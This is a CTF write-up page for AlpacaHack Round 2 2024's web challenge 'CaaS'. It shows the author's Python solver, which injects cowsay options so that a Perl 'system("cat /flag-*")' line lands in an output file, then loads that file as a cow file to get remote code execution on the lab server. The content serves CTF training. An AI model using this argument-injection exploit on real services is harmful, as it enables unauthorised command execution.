---
title: "Caas - AlpacaHack Round 2 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "caas", "web", "alpacahack-round-2"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/caas"
license: "none stated"
ctf:
  name: "AlpacaHack Round 2"
  year: 2024
  challenge: "Caas"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/caas>
- **CTF:** AlpacaHack Round 2 2024

---

# [web] CaaS

## Description

🐮📢 < Hello!

## Attachments

- [caas](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/caas/solution/solve.py>

```python
import os
import httpx
from urllib.parse import quote

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

def cowsay(messages: list[str]) -> str:
  uuid = client.get(f"/say?{"&".join([f"message[]={quote(m)}" for m in messages])}").json()["uuid"]
  return uuid

messages = ["-f", "suse", 'system("cat /flag-*"); s@']
uuid = cowsay(messages)
print(f"{uuid = }")

# ./{uuid}:
# ```perl
#  ___________________________
# < system("cat /flag-*"); s@ >
#  ---------------------------
#   \
#    \____
#   /@    ~-.
#   \/ __ .- |
#    // //  @
# ````

messages = ["-f", f"./{uuid}", "RCE with Cowsay Assistance!"]
uuid = cowsay(messages)
out = client.get(f"/out/{uuid}").text
print(out)
```
